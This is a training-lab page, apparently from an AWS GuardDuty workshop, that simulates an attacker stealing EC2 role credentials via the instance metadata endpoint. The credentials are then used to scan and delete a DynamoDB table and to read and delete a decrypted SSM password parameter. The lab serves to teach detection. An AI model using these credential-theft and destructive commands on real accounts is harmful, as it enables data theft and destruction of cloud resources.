---
title : "Create Findings"
date :  2025-06-11
weight : 2 
chapter : false
pre : " <b> 3.3. </b> "
---
### Situation 3:: 
Long has just realized that the recent attacks are simulated attacks, the Findings are automatically generated from CloudFormation Template to review the security capabilities of Security Hub and GuardDuty. However, the security risk still exists, a hacker named Bao has successfully retrieved the temporary IAM security credential generated by the IAM role of EC2 instance. So how did this hacker retrieve it?

**Retrieve temporary IAM security credentials with Systems Manager**

To perform this final attack, Bao needs to successfully retrieve the temporary IAM security credential generated by the IAM role of the EC2 instance. Bao can try one of the following two ways:
1. SSH into EC2 instance and query EC2 instance Metadata data.
2. Use the Session Manager functionality of the AWS System Manager service.

> We will proceed to create the Findings
1. Access the Session Manager at ap-southeast-1.

![create findings](/images/3.attack/3.3/1.png)

2. In the right hand navigation bar, select **Start Session**.

![create findings](/images/3.attack/3.3/2.png)

3. In the **Target instances** section we will see a managed EC2 instance with the following name format - **GuardDuty-Example: Compromised Instance: Scenario 3** with SSM Agent ping status as Online.
4. Select instance **GuardDuty-Example: Compromised Instance: Scenario 3** and press **Start session**.

![create findings](/images/3.attack/3.3/3.png)

5. Execute the Metadata query statement:

         curl http://169.254.169.254/latest/meta-data/iam/security-credentials/GuardDuty-Example-EC2-Compromised

6. Open notepad, take notes of some important information below:
- Access Key ID
- Secret Access Key
- Session Token

![create findings](/images/3.attack/3.3/4.png)

### Create AWS CLI Profile on your PC
After successfully retrieving the temporary IAM security credential, we will proceed to create an AWS CLI Profile on our personal computer. From Terminal/CMD/PowerShell, we proceed to replace the values ​​with the specific values ​​we collected, then enter the following commands:

      aws configure set profile.iamhacker.region ap-southeast-1
      aws configure set profile.iamhacker.aws_access_key_id <ACCESS_KEY_ID>
      aws configure set profile.iamhacker.aws_secret_access_key <SECRET_ACCESS_KEY>
      aws configure set profile.iamhacker.aws_session_token <SESSION_TOKEN>

We can use the following command to quickly check if there is an AWS CLI Profile named **iamhacker**
      
      aws configure --profile iamhacker

![create findings](/images/3.attack/3.4/1.png)

#### Execute AWS CLI commands using temporary IAM security credentials
Using the AWS CLI commands below, we make API calls to different AWS services.

**What permissions does an IAM user have?**
      
      aws iam get-user --profile iamhacker
      aws iam create-user --user-name BuiChiBao --profile iamhacker

![create findings](/images/3.attack/3.4/2.png)

> So IAM user can not get-user nor create-user

**Is there access to DynamoDB?**

      aws dynamodb list-tables --profile iamhacker
      aws dynamodb describe-table --table-name GuardDuty-Example-Customer-DB --profile iamhacker

![create findings](/images/3.attack/3.4/3.png)

![create findings](/images/3.attack/3.4/4.png)
**Is there any access to DynamoDB data?**

      aws dynamodb scan --table-name GuardDuty-Example-Customer-DB --profile iamhacker
      aws dynamodb delete-table --table-name GuardDuty-Example-Customer-DB --profile iamhacker
      aws dynamodb list-tables --profile iamhacker

![create findings](/images/3.attack/3.4/5.png)

![create findings](/images/3.attack/3.4/6.png)

> This way the hacker has access and can query data to DynamoDB.

**Is it possible to access the System Manager Parameter Store?**

      aws ssm describe-parameters --profile iamhacker
      aws ssm get-parameters --names "gd_prod_dbpwd_sample" --profile iamhacker
      aws ssm get-parameters --names "gd_prod_dbpwd_sample" --with-decryption --profile iamhacker
      aws ssm delete-parameter --name "gd_prod_dbpwd_sample" --profile iamhacker

![create findings](/images/3.attack/3.4/7.png)

> This gives the hacker access to the System Manager Parameter Store.